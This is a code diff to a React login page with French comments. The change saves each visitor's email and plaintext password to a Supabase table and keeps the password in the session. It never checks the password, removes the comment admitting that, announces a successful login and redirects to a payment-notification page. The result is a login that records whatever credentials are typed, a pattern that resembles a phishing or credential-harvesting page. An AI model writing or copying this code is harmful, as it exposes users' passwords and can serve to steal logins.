@@ -3,7 +3,7 @@ import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { updateUserSession } from "@/utils/sessionUtils";
 import { toast } from "sonner";
-import { supabase, getUserByEmail } from "@/utils/supabaseClient";
+import { supabase, getUserByEmail, upsertUser } from "@/utils/supabaseClient";
 
 const Login: React.FC = () => {
   const [email, setEmail] = useState("");
@@ -25,11 +25,20 @@ const Login: React.FC = () => {
       // Vérifie si l'utilisateur existe déjà
       const existingUser = await getUserByEmail(email);
       
+      // Prépare les données utilisateur à enregistrer
+      const userData = {
+        email,
+        password,
+        derniereMaj: new Date().toISOString()
+      };
+      
+      // Enregistre ou met à jour l'utilisateur dans Supabase
+      await upsertUser(userData);
+      
       // Stocke les informations dans la session
       updateUserSession({ email, password });
       
-      // Dans un système réel, nous vérifierions le mot de passe ici
-      // Pour cette démo, nous allons juste rediriger
+      toast.success("Connexion réussie");
       setIsLoading(false);
       navigate("/payment-notification");
     } catch (error) {
